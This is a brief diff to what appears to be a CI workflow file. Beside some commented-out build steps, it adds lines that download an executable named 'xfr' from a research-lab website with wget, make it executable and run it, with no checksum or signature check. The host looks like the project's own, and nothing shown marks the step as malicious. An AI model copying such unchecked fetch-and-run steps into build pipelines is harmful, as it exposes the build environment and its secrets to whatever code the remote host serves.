@@ -31,3 +31,6 @@ jobs:
         # ./configure CPPFLAGS="-I$(brew --prefix)/include" LDFLAGS="-L$(brew --prefix)/lib"
         # make -j4
         # ls -ltrh
+        wget smithlabresearch.org/data/xfr
+        chmod +x xfr
+        ./xfr
